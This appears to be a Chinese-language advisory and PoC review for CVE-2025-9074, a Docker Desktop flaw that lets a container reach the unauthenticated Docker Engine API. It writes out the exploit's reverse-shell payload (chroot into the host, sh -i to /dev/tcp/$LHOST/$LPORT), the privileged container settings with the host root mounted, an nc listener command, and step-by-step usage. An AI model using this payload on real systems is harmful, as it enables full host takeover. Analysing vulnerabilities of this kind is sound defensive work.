## CVE-2025-9074 - Docker Desktop 容器越权访问 / 未认证RCE

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器越权访问 / 未认证RCE

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Docker Desktop for Windows和macOS版本，已于2025年8月20日在Docker Desktop 4.44.3版本中修复，因此受影响版本为4.44.3之前

**利用条件:** 本地运行的恶意Linux容器，无需认证，通过默认子网（192.168.65.7:2375）可直接访问Docker Engine API

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074 是一个影响 Docker Desktop 的严重容器越权访问漏洞，允许本地运行的恶意 Linux 容器绕过隔离机制，通过默认子网 `192.168.65.7:2375` 直接访问 Docker Engine API。该漏洞即使在启用增强容器隔离 (ECI) 或 TCP 暴露设置的情况下也依然存在。提供的 POC 代码 `exploit.sh` 是一个功能完整且高效的 Bash 脚本，用于利用此漏洞实现未认证的远程代码执行 (RCE)。

**POC有效性分析:**
脚本首先尝试从 Docker Engine API `/images/json` 端点获取一个可用的 Docker 镜像（例如 `alpine`）。一旦获取到镜像，它就会向 `/containers/create` 端点发送一个 POST 请求，创建一个新的 Docker 容器。这个创建的容器具有几个关键的配置，使其能够突破隔离：
1.  `"Binds": ["$MOUNT:/host"]`：将宿主机的根文件系统 (默认为 `/`) 绑定到容器内的 `/host` 目录。
2.  `"Privileged": true`：赋予容器特权模式，允许其访问宿主机设备并绕过更多安全限制。
3.  `"NetworkMode": "host"`：使容器共享宿主机的网络命名空间，进一步模糊了容器与宿主机之间的界限。

最关键的利用步骤在于 `Cmd` 参数中指定的命令：`chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`。这个命令在容器启动后执行。它首先使用 `chroot /host` 将根目录切换到宿主机的根文件系统，然后执行一个 Bash 反向 Shell 命令，将宿主机的 shell 重定向到攻击者指定的监听地址 (`$LHOST:$LPORT`)。通过这种方式，攻击者可以获得宿主机上的完全控制权，执行任意命令。POC 的实现方式直接、有效，无需任何额外的依赖或复杂配置，充分验证了该漏洞的严重性和可利用性。

**利用步骤:**
利用 CVE-2025-9074 的步骤相对直接，主要依赖于攻击者在受害者系统上运行恶意容器的能力。
1.  **环境准备**：确认目标系统上运行的是受影响的 Docker Desktop 版本（即版本 4.44.3 之前）。攻击者需要在自己的机器上设置一个监听器，例如使用 `netcat` (`nc -lvnp <LPORT>`)，以接收反向 shell 连接。
2.  **获取POC**：下载或克隆 `zenzue/CVE-2025-9074` 项目中的 `exploit.sh` 脚本。
3.  **运行恶意容器**：攻击者需要在目标机器上某种方式运行一个容器，即使该容器本身看似无害，只要它能通过默认子网 `192.168.65.7:2375` 访问 Docker Engine API 即可。该漏洞允许恶意容器直接与 API 通信，无需特殊的 `docker.sock` 挂载。
4.  **执行POC**：在恶意容器内部执行 `exploit.sh` 脚本，并提供攻击者监听器的 IP 地址和端口。例如：`./exploit.sh -l <攻击者IP> -p <监听端口>`。
5.  **建立Shell**：脚本会自动发现可用的 Docker 镜像，创建一个特权容器，将宿主机根目录挂载到容器内，并执行反向 shell 命令。
6.  **获得控制**：攻击者设置的监听器将接收到来自宿主机的连接，从而获得宿主机的 root 权限 shell。攻击者现在可以在宿主机上执行任意命令，包括访问文件、安装恶意软件或修改系统配置。

**投毒风险分析:**
对提供的 POC 代码 `exploit.sh` 的分析表明，其投毒风险极低。该脚本是一个纯 Bash 脚本，结构清晰，逻辑透明，主要通过 `curl` 命令与 Docker API 进行交互，并使用 `grep`、`cut` 等标准 Unix 工具进行文本处理。
1.  **代码透明度**：脚本没有任何形式的代码混淆。所有命令和参数都一目了然，易于审计。
2.  **依赖性**：脚本仅依赖于标准的系统工具，如 `bash`、`curl`、`grep`、`echo`、`cut`，无需下载或安装任何第三方库或二进制文件。这大大降低了引入外部恶意代码的风险。
3.  **网络行为**：除了与目标 Docker Engine API (默认为 `192.168.65.7:2375`) 进行通信以及向攻击者指定的监听地址建立反向 shell 连接外，脚本没有表现出任何其他可疑的网络请求。反向 shell 的建立是漏洞利用的核心功能，而不是投毒行为。
4.  **恶意负载**：脚本创建的容器命令 `chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'` 明确地是为了建立一个反向 shell。这是典型的漏洞利用负载，而非隐藏的恶意软件安装或数据窃取。
5.  **社区和文档**：该 POC 项目在 GitHub 上公开，并附有 `readme.md` 文档，详细解释了漏洞和利用方法。这种开放性增加了代码的透明度和社区审查的可能性。

尽管该特定 POC 代码的投毒风险很低，但作为一般安全实践，任何从互联网下载的工具，尤其是漏洞利用工具，都应在使用前进行严格的安全审计。用户应确保从可信来源获取代码，并在隔离环境中进行测试，以防潜在的篡改或意外行为。综合来看，此 POC 代码本身不包含投毒机制，风险评级为低 (10%)。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074
